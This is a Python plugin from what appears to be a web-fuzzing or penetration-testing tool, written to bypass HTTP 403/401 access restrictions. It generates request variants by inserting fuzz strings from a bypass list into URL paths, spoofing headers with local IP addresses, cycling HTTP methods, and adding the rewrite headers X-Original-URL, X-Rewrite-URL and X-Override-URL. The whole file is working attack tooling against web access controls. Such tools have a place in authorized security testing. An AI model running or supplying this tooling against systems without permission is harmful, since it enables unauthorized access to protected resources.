#This module attempts to bypass 403/401 directories
from yapsy.IPlugin import IPlugin
from lib.requestObject import RequestObject
from lib.fileOp import FileOp
from lib.dataparser import ParseArguments
from lib.urlObject import UrlObject
import random, copy

class Bypass(IPlugin):
    def gen(self, reqs, module, rules):
        requestList = []    #Store generated request objects
        bypass = FileOp(rules['cwd']+'/lists/bypass.txt').reader()
        all_methods = [ "GET", "POST", "OPTIONS", "PUT", "PATCH", "HEAD",
                        "DELETE", "TRACE", "DEBUG", "AAA" ]
        newurl = ''
        headers = FileOp(rules['cwd']+'/lists/all-headers.txt').reader()

        for req in reqs:
            u = UrlObject(req.url)
            
            #Try url/*fuzz*
            for fuzz in bypass:
                newurl = u.u_d + fuzz
                req_get = copy.deepcopy(req)
                req_get.update_url(newurl)
                req_get.update_reqID('reqID')
                req_get.update_module(module)
                requestList.append(req_get)

            #Try url(-1 dir)/*fuzz*
            for fuzz in bypass:
                newurl = u.u_dd + fuzz
                req_get = copy.deepcopy(req)
                req_get.update_url(newurl)
                req_get.update_reqID('reqID')
                req_get.update_module(module)
                requestList.append(req_get)

            #Try url/*fuzz*/PATH
            for fuzz in bypass:
                newurl = u.u_d + fuzz + u.lastpath
                req_get = copy.deepcopy(req)
                req_get.update_url(newurl)
                req_get.update_reqID('reqID')
                req_get.update_module(module)
                requestList.append(req_get)

            #Try url(-1 dir)/*fuzz*/PATH
            for fuzz in bypass:
                newurl = u.u_dd + fuzz + u.lastpath
                req_get = copy.deepcopy(req)
                req_get.update_url(newurl)
                req_get.update_reqID('reqID')
                req_get.update_module(module)
                requestList.append(req_get)

            #Try url/*fuzz**fuzz2*/PATH
            for fuzz in bypass:
                for fuzz2 in bypass:
                    newurl = u.u_d + fuzz + fuzz2 + u.lastpath
                    req_get = copy.deepcopy(req)
                    req_get.update_url(newurl)
                    req_get.update_reqID('reqID')
                    req_get.update_module(module)
                    requestList.append(req_get)

            #Try url/*fuzz*/PATH/*fuzz2*/
            for fuzz in bypass:
                for fuzz2 in bypass:
                    newurl = u.u_d + fuzz + u.lastpath + fuzz2
                    req_get = copy.deepcopy(req)
                    req_get.update_url(newurl)
                    req_get.update_reqID('reqID')
                    req_get.update_module(module)
                    requestList.append(req_get)

            
            #Try all headers for local ranges
            local_range = ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.0.1']
            for ip in local_range:
                for head in headers:
                    req_head = copy.deepcopy(req)
                    heads = req.headers.copy()
                    heads[head] = ip
                    req_head.update_headers(heads)
                    req_head.update_reqID('reqID')
                    req_head.update_module(module)
                    requestList.append(req_head)
                    del heads[head]

            #Try all methods
            for method in all_methods:
                req_m = copy.deepcopy(req)
                req_m.update_method(method)
                req_m.update_reqID('reqID')
                req_m.update_module(module)
                requestList.append(req_m)

            #Try known bypasses
            known = ['X-Original-URL', 'X-Rewrite-URL', 'X-Override-URL']
            for head in known:
                newurl = u.u_d
                req_head = copy.deepcopy(req)
                heads = req.headers.copy()
                heads[head] = '/'+u.lastpath
                req_head.update_headers(heads)
                req_head.update_reqID('reqID')
                req_head.update_module(module)
                requestList.append(req_head)
                del heads[head]

                req_head = copy.deepcopy(req)
                heads = req.headers.copy()
                heads[head] = '/'+u.lastpath+'/'
                req_head.update_headers(heads)
                req_head.update_reqID('reqID')
                req_head.update_module(module)
                requestList.append(req_head)
                del heads[head]
        
        return requestList
